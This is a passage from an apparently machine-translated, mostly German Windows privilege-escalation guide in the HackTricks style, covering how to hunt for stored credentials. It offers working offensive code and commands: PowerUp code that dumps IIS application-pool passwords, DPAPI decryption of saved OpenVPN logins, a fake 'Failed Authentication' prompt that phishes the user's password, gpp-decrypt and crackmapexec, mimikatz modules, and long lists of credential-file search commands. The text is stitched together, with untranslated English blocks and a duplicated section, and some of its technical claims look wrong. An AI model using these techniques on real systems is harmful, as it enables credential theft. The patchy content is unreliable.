Um die Remote Desktop-Anmeldeinformationsverwaltung abzusichern, können folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke Passwörter für die Remote-Desktop-Anmeldeinformationen.
- Aktivieren Sie die Zwei-Faktor-Authentifizierung für Remote-Desktop-Verbindungen.
- Überprüfen Sie regelmäßig die gespeicherten Anmeldeinformationen im Credential Manager und entfernen Sie nicht mehr benötigte Einträge.
- Aktualisieren Sie regelmäßig das Betriebssystem und installieren Sie Sicherheitsupdates, um bekannte Schwachstellen zu beheben.

---

#### Referenzen

- [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager)
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwenden Sie das **Mimikatz**-Modul `dpapi::rdg` mit dem entsprechenden `/masterkey`, um **.rdg-Dateien zu entschlüsseln**.\
Sie können mit dem Mimikatz-Modul `sekurlsa::dpapi` viele DPAPI-Masterkeys aus dem Speicher extrahieren.

### Sticky Notes

Menschen verwenden oft die StickyNotes-App auf Windows-Workstations, um Passwörter und andere Informationen zu **speichern**, ohne zu erkennen, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<Benutzer>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und es lohnt sich immer, danach zu suchen und sie zu untersuchen.

### AppCmd.exe

**Beachten Sie, dass Sie Administrator sein und unter einer hohen Integritätsstufe ausgeführt werden müssen, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, besteht die Möglichkeit, dass einige **Anmeldeinformationen** konfiguriert wurden und wiederhergestellt werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Überprüfen Sie, ob `C:\Windows\CCM\SCClient.exe` existiert.\
Installationsprogramme werden mit **SYSTEM-Berechtigungen ausgeführt**, viele sind anfällig für **DLL-Sideloadings (Informationen von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registrierung (Anmeldedaten)

### Putty-Anmeldedaten
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Hostschlüssel

Putty ist ein beliebter SSH-Client, der auf Windows-Systemen verwendet wird. Beim ersten Verbindungsaufbau mit einem SSH-Server generiert Putty automatisch einen Hostschlüssel und speichert ihn in der Windows-Registrierung. Diese Hostschlüssel werden verwendet, um die Integrität des SSH-Servers zu überprüfen und Man-in-the-Middle-Angriffe zu verhindern.

Die Putty SSH Hostschlüssel werden in der Windows-Registrierung unter dem Pfad `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys` gespeichert. Jeder Hostschlüssel wird durch einen eindeutigen Registry-Eintrag repräsentiert.

Es ist wichtig zu beachten, dass diese Hostschlüssel nicht vertrauenswürdig sind, da sie automatisch generiert werden und nicht über eine vertrauenswürdige Zertifizierungsstelle (CA) signiert sind. Daher sollten Sie die Hostschlüssel manuell überprüfen, um sicherzustellen, dass Sie mit dem richtigen SSH-Server verbunden sind.

Um die Putty SSH Hostschlüssel anzuzeigen, können Sie die Windows-Registrierung öffnen und zum oben genannten Pfad navigieren. Dort finden Sie die einzelnen Registry-Einträge, die die Hostschlüssel repräsentieren. Jeder Eintrag enthält Informationen wie den Hostnamen, den Port und den öffentlichen Schlüssel des SSH-Servers.

Es wird empfohlen, die Putty SSH Hostschlüssel regelmäßig zu überprüfen und verdächtige oder unbekannte Schlüssel zu entfernen, um potenzielle Sicherheitsrisiken zu minimieren.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Schlüssel in der Registrierung

SSH-Private Keys können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden. Daher sollten Sie überprüfen, ob dort etwas Interessantes vorhanden ist:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er wird verschlüsselt gespeichert, kann aber mithilfe von [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik finden Sie hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der Dienst `ssh-agent` nicht ausgeführt wird und Sie möchten, dass er beim Start automatisch gestartet wird, führen Sie Folgendes aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich über SSH bei einer Maschine anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und Procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht erkannt.
{% endhint %}

### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
# Windows Local Privilege Escalation

## Introduction

This guide provides techniques for escalating privileges on a Windows system. Privilege escalation is the process of gaining higher levels of access and control over a system than what is initially granted to a user. By exploiting vulnerabilities or misconfigurations, an attacker can elevate their privileges and gain unauthorized access to sensitive resources.

## Enumeration

Before attempting privilege escalation, it is important to gather information about the target system. Enumeration involves identifying the operating system, installed software, and user accounts. This information can be used to identify potential vulnerabilities and attack vectors.

### System Information

To gather system information, use the following commands:

- `systeminfo`: Displays detailed information about the operating system and hardware.
- `wmic qfe list`: Lists installed hotfixes and patches.
- `wmic product get name,version`: Lists installed software and their versions.
- `net start`: Lists running services.

### User Accounts

To enumerate user accounts, use the following commands:

- `net user`: Lists all user accounts on the system.
- `net localgroup administrators`: Lists members of the Administrators group.
- `net localgroup "Remote Desktop Users"`: Lists members of the Remote Desktop Users group.

### File and Directory Permissions

To check file and directory permissions, use the following commands:

- `icacls <file/directory>`: Displays the permissions of a file or directory.
- `cacls <file/directory>`: Displays or modifies file or directory permissions.

### Registry Permissions

To check registry permissions, use the following commands:

- `reg query <registry key>`: Displays the permissions of a registry key.
- `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`: Lists programs that run at startup.

## Exploitation

Once vulnerabilities or misconfigurations have been identified, they can be exploited to escalate privileges. This section covers common techniques for privilege escalation on Windows systems.

### Weak Service Permissions

If a service is running with high privileges and has weak permissions, it may be possible to replace the executable with a malicious one. When the service is restarted, the malicious executable will run with the same privileges, allowing for privilege escalation.

### DLL Hijacking

DLL hijacking involves replacing a legitimate DLL file with a malicious one. When an application loads the DLL, the malicious code is executed with the same privileges as the application, potentially leading to privilege escalation.

### Unquoted Service Paths

If a service is installed with an unquoted service path, it may be possible to manipulate the path and execute arbitrary code with elevated privileges.

### Insecure Service Registry Permissions

If a service has insecure registry permissions, it may be possible to modify the registry key and execute arbitrary code with elevated privileges.

### Weak Registry Permissions

If a registry key has weak permissions, it may be possible to modify the key and execute arbitrary code with elevated privileges.

### Insecure File and Directory Permissions

If a file or directory has weak permissions, it may be possible to modify the file or directory and execute arbitrary code with elevated privileges.

### Exploiting Weak Credentials

If weak credentials are used for local accounts or services, it may be possible to brute force or guess the password and gain unauthorized access with elevated privileges.

## Conclusion

Privilege escalation is a critical step in the exploitation of a system. By understanding the techniques and vulnerabilities involved, you can effectively escalate your privileges and gain unauthorized access to sensitive resources. However, it is important to note that privilege escalation should only be performed on systems that you have explicit permission to test or assess.
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-Backups

In Windows, the SAM (Security Accounts Manager) and SYSTEM files contain important information related to user accounts and system configuration. These files are usually locked and cannot be accessed while the operating system is running. However, if you have administrative privileges, you can create backups of these files and extract sensitive information from them.

#### Creating SAM & SYSTEM Backups

To create backups of the SAM and SYSTEM files, you can use various methods:

1. **Shadow Volumes**: If the Volume Shadow Copy Service (VSS) is enabled, you can use tools like `vssadmin` or `vshadow` to create shadow copies of the files. These shadow copies can then be mounted and accessed to extract the SAM and SYSTEM files.

2. **Offline Registry Hives**: You can boot the system using an external media (e.g., a live USB) and access the registry hives offline. Tools like `regedit` or `chntpw` can be used to load the offline hives and extract the SAM and SYSTEM files.

3. **Windows Backup**: If the Windows Backup feature is enabled, you can create a backup of the entire system, including the SAM and SYSTEM files. This backup can be restored on another system or accessed offline to extract the required files.

#### Extracting Information from SAM & SYSTEM Backups

Once you have the SAM and SYSTEM backups, you can extract sensitive information from them, such as:

- **User Password Hashes**: The SAM file contains password hashes for local user accounts. These hashes can be cracked or used for pass-the-hash attacks.

- **LAPS Passwords**: If the Local Administrator Password Solution (LAPS) is implemented, the SYSTEM file may contain the password for the local Administrator account.

- **Cached Credentials**: The SAM file may contain cached credentials for domain users, which can be used for offline password cracking or pass-the-ticket attacks.

- **Security Policies**: The SYSTEM file stores security policies, including password complexity requirements, account lockout policies, and more.

By creating backups of the SAM and SYSTEM files and extracting information from them, you can gain valuable insights and potentially escalate your privileges on a Windows system.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Anmeldeinformationen

Cloud-Anmeldeinformationen sind Zugangsdaten, die verwendet werden, um auf Cloud-Dienste und -Ressourcen zuzugreifen. Diese Anmeldeinformationen können Benutzername und Passwort, API-Schlüssel, Zugriffstoken oder Zertifikate umfassen. Sie dienen dazu, die Identität des Benutzers zu überprüfen und den Zugriff auf die Cloud-Ressourcen zu autorisieren.

Es ist äußerst wichtig, die Sicherheit der Cloud-Anmeldeinformationen zu gewährleisten, da ein Kompromittieren dieser Informationen zu erheblichen Sicherheitsrisiken führen kann. Hacker könnten auf vertrauliche Daten zugreifen, Ressourcen manipulieren oder sogar die Kontrolle über das gesamte Cloud-Konto übernehmen.

Um die Sicherheit der Cloud-Anmeldeinformationen zu gewährleisten, sollten folgende bewährte Verfahren befolgt werden:

1. Verwenden Sie starke, eindeutige Passwörter für alle Cloud-Konten.
2. Aktivieren Sie die Zwei-Faktor-Authentifizierung (2FA) für zusätzliche Sicherheit.
3. Vermeiden Sie das Teilen von Anmeldeinformationen zwischen verschiedenen Cloud-Konten.
4. Regelmäßig überprüfen und aktualisieren Sie die Zugriffsrechte für Cloud-Anmeldeinformationen.
5. Verwenden Sie sichere Methoden zur Speicherung und Übertragung von Anmeldeinformationen, wie z.B. verschlüsselte Passwortmanager oder sichere Protokolle.

Indem Sie diese bewährten Verfahren befolgen, können Sie die Sicherheit Ihrer Cloud-Anmeldeinformationen verbessern und das Risiko eines unbefugten Zugriffs oder einer Kompromittierung minimieren.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher war es möglich, über Gruppenrichtlinieneinstellungen (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Maschinen bereitzustellen. Diese Methode wies jedoch erhebliche Sicherheitslücken auf. Erstens konnten die als XML-Dateien in SYSVOL gespeicherten Gruppenrichtlinienobjekte (GPOs) von jedem Domänenbenutzer abgerufen werden. Zweitens konnten die mit AES256 verschlüsselten Passwörter in diesen GPPs mithilfe eines öffentlich dokumentierten Standardschlüssels von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernsthaftes Risiko dar, da Benutzern dadurch erhöhte Berechtigungen gewährt werden konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, um nach lokal zwischengespeicherten GPP-Dateien zu suchen, die ein nicht leeres Feld "cpassword" enthalten. Beim Auffinden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details über die GPP und den Speicherort der Datei, was bei der Identifizierung und Behebung dieser Sicherheitslücke hilfreich ist.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Um das cPassword zu entschlüsseln:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Verwendung von crackmapexec, um die Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

Die IIS-Webkonfiguration (Internet Information Services) ist eine wichtige Datei, die die Konfigurationseinstellungen für eine Website auf einem Windows-Server enthält. Diese Datei, die als "web.config" bezeichnet wird, enthält Informationen über verschiedene Aspekte der Website, wie z.B. Verbindungszeiten, Authentifizierung, Autorisierung, Fehlerbehandlung und vieles mehr.

Die IIS-Webkonfiguration kann auch für die Durchführung von Privilege Escalation-Angriffen verwendet werden. Durch das Ausnutzen von Schwachstellen oder Fehlkonfigurationen in der web.config-Datei können Angreifer höhere Berechtigungen auf dem betroffenen System erlangen.

Einige gängige Techniken zur Privilege Escalation über die IIS-Webkonfiguration umfassen das Hinzufügen von Benutzern zur Gruppe der lokalen Administratoren, das Ändern von Berechtigungen für bestimmte Verzeichnisse oder das Ausführen von bösartigem Code mit erhöhten Rechten.

Es ist wichtig, die IIS-Webkonfiguration regelmäßig zu überprüfen und sicherzustellen, dass sie ordnungsgemäß konfiguriert ist, um potenzielle Schwachstellen zu identifizieren und zu beheben.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel für eine web.config mit Anmeldedaten:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Anmeldeinformationen

To establish a connection with an OpenVPN server, you will need the following credentials:

- **Username**: The username provided by the OpenVPN server administrator.
- **Password**: The password associated with your OpenVPN account.

These credentials are necessary to authenticate and authorize your access to the OpenVPN network. Make sure to keep them secure and avoid sharing them with unauthorized individuals.

### OpenVPN-Zugangsdaten

Um eine Verbindung mit einem OpenVPN-Server herzustellen, benötigen Sie folgende Zugangsdaten:

- **Benutzername**: Der vom OpenVPN-Server-Administrator bereitgestellte Benutzername.
- **Passwort**: Das mit Ihrem OpenVPN-Konto verknüpfte Passwort.

Diese Zugangsdaten sind erforderlich, um Ihre Authentifizierung und Autorisierung für den Zugriff auf das OpenVPN-Netzwerk zu ermöglichen. Stellen Sie sicher, dass Sie sie sicher aufbewahren und nicht mit unbefugten Personen teilen.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle

Logs sind Aufzeichnungen von Ereignissen, die in einem Computersystem auftreten. Sie dienen dazu, Informationen über Aktivitäten, Fehler und Warnungen zu speichern. In Windows-Betriebssystemen werden verschiedene Arten von Logs verwendet, um wichtige Informationen über das System zu protokollieren.

#### Windows Event Logs

Windows Event Logs sind eine wichtige Quelle für Informationen über das Betriebssystem und Anwendungen. Sie enthalten Ereignisse wie Systemstart, Anwendungsfehler, Sicherheitsverletzungen und vieles mehr. Die Event Logs sind in verschiedene Kategorien unterteilt, wie z.B. Anwendung, Sicherheit, System und Setup.

#### Security Logs

Die Security Logs enthalten Informationen über Sicherheitsereignisse, wie z.B. fehlgeschlagene Anmeldeversuche, erfolgreiche Anmeldungen, Änderungen an Sicherheitsrichtlinien usw. Diese Logs sind besonders wichtig für die Erkennung von Sicherheitsverletzungen und Angriffen.

#### Application Logs

Die Application Logs enthalten Informationen über Anwendungsereignisse, wie z.B. Fehler, Warnungen und Informationen zu bestimmten Anwendungen. Diese Logs können bei der Fehlerbehebung und der Überwachung von Anwendungen hilfreich sein.

#### System Logs

Die System Logs enthalten Informationen über Systemereignisse, wie z.B. Hardwarefehler, Treiberprobleme und Systemabstürze. Sie sind nützlich, um Probleme mit dem Betriebssystem zu diagnostizieren und zu beheben.

#### Setup Logs

Die Setup Logs enthalten Informationen über die Installation und Konfiguration von Software und Hardware. Sie können bei der Überwachung von Installationsvorgängen und der Fehlerbehebung helfen.

#### Analyse von Logs

Die Analyse von Logs ist ein wichtiger Schritt bei der Untersuchung von Sicherheitsvorfällen und der Suche nach Anomalien im System. Durch die Überprüfung von Logs können verdächtige Aktivitäten identifiziert und Sicherheitslücken aufgedeckt werden.

#### Log-Dateien löschen

Das Löschen von Log-Dateien kann dazu dienen, Spuren von Aktivitäten zu verwischen und die Nachverfolgung von Angriffen zu erschweren. Es ist jedoch wichtig zu beachten, dass das Löschen von Log-Dateien verdächtig sein kann und auf eine böswillige Absicht hinweisen kann.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Anmeldeinformationen fragen

Sie können den Benutzer immer auffordern, seine Anmeldeinformationen oder sogar die Anmeldeinformationen eines anderen Benutzers einzugeben, wenn Sie glauben, dass er sie kennen könnte (beachten Sie jedoch, dass es sehr riskant ist, den Client direkt nach den Anmeldeinformationen zu fragen):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die Anmeldeinformationen enthalten könnten**

Bekannte Dateien, die früher **Klartext** oder **Base64**-kodierte **Passwörter** enthielten.
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Durchsuche alle vorgeschlagenen Dateien:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Anmeldedaten im Papierkorb

Sie sollten auch den Papierkorb überprüfen, um nach darin enthaltenen Anmeldedaten zu suchen.

Um **gespeicherte Passwörter** mehrerer Programme wiederherzustellen, können Sie folgende Website verwenden: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Im Registrierungseditor

**Andere mögliche Registrierungsschlüssel mit Anmeldedaten**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extrahieren Sie Openssh-Schlüssel aus der Registrierung.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Überprüfen Sie auch den Verlauf, die Lesezeichen und Favoriten der Browser, um zu sehen, ob dort **Passwörter gespeichert sind**.

Tools zum Extrahieren von Passwörtern aus Browsern:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL-Überschreibung**

**Component Object Model (COM)** ist eine Technologie, die in das Windows-Betriebssystem integriert ist und die **Kommunikation** zwischen Softwarekomponenten unterschiedlicher Sprachen ermöglicht. Jede COM-Komponente wird über eine Klassen-ID (CLSID) identifiziert und jede Komponente stellt Funktionalitäten über eine oder mehrere Schnittstellen bereit, die über Schnittstellen-IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registrierung unter **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und **HKEY\_**_**CLASSES\_**_**ROOT\Interface** definiert. Diese Registrierung wird erstellt, indem die **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** zusammengeführt werden = **HKEY\_**_**CLASSES\_**_**ROOT.**

In den CLSIDs dieser Registrierung finden Sie die untergeordnete Registrierung **InProcServer32**, die einen **Standardwert** enthält, der auf eine **DLL** zeigt, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single oder Multi) oder **Neutral** (Thread Neutral) sein kann.

![](<../../.gitbook/assets/image (638).png>)

Grundsätzlich können Sie, wenn Sie eine der DLLs **überschreiben**, die ausgeführt werden sollen, Berechtigungen **erhöhen**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu erfahren, wie Angreifer COM-Hijacking als Persistenzmechanismus verwenden, lesen Sie:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registrierung**

**Suchen Sie nach Dateiinhalten**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suche nach einer Datei mit einem bestimmten Dateinamen**

Um nach einer Datei mit einem bestimmten Dateinamen zu suchen, können Sie den Befehl `dir` verwenden. Der Befehl `dir` zeigt eine Liste der Dateien und Verzeichnisse im aktuellen Verzeichnis an. Sie können den Befehl mit dem Parameter `/s` verwenden, um die Suche in allen Unterverzeichnissen durchzuführen.

```plaintext
dir /s /b "Dateiname"
```

- Der Parameter `/s` führt die Suche in allen Unterverzeichnissen durch.
- Der Parameter `/b` gibt nur den Dateinamen aus.

Beispiel:

```plaintext
dir /s /b "meineDatei.txt"
```

Dieser Befehl sucht nach der Datei mit dem Namen "meineDatei.txt" in allen Unterverzeichnissen und gibt den vollständigen Pfad zur Datei aus, wenn sie gefunden wird.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
